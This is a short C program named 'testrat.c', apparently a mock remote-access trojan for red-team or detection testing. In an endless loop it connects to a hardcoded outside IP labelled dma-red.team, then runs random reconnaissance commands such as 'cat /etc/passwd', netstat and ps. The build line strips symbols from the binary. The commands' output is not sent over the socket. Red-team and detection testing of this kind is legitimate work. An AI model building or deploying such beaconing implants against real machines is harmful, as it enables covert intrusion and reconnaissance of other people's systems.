/* gcc -Os -s testrat.c; strip -s a.out */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <time.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#define HOST "40.79.72.115"  /* dma-red.team */
#define PORT 80

char *cmds[] = {
  "id",
  "cat /etc/passwd",
  "w",
  "lastlog",
  "last",
  "ifconfig",
  "netstat -an",
  "ss -an",
  "ip addr",
  "date",
  "ps -ef --forest",
  "ls -lart"
};
#define NUMCMDS (sizeof(cmds)/sizeof(*cmds))

int main(int argc, char *argv[])
{
  int s;
  srand(time(NULL));
  while (true)
  {
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0)
      return 1;
    struct sockaddr_in addr = {.sin_family=AF_INET, .sin_port=htons(PORT)};
    if (inet_aton(HOST, &addr.sin_addr) == 0)
      return 2;
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0)
      return 3;
    system(cmds[rand() % NUMCMDS]);
    sleep(5);
    shutdown(s, SHUT_RDWR);
    close(s);
  }
  return 0;
}
